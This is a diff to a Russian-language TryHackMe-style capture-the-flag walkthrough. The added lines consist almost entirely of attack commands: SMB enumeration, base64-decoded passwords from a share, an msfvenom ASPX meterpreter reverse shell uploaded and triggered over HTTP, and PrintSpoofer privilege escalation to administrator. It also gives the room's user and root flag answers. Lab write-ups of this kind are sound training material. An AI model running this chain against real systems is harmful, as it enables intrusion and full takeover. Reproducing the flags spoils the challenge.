@@ -38,9 +38,37 @@
 ### Ответьте на вопросы ниже
 Пользовательский флаг
 ```commandline
+nmap -sC -sV -p- <IP>
+smbclient //<IP>
+smbclient //<IP>/nt4wrksv
+get passwords.txt
+cat passwords.txt 
+echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
+# Bob - !P@$$W0rD!123
+echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d
+# Bill - Juw4nnaM4n420696969!$$$
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=<IP> lport=4444 -f aspx -o shell.aspx
+put shell.aspx
+msfconsole -q
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp
+set lhost <IP>
+set lport 4444
+run
+curl http://<IP>:49663/nt4wrksv/shell.aspx
+cat c:/users/bob/desktop/user.txt
+```
+```commandline
 THM{fdk4ka34vk346ksxfr21tg789ktf45}
 ```
 Корневой флаг
+```commandline
+getprivs
+cd \inetpub\wwwroot\nt4wrksv
+PrintSpoofer.exe -i -c powershell.exe
+cd \users\administrator\desktop
+cat root.txt
+```
 ```commandline
 THM{1fk5kf469devly1gl320zafgl345pv}
 ```
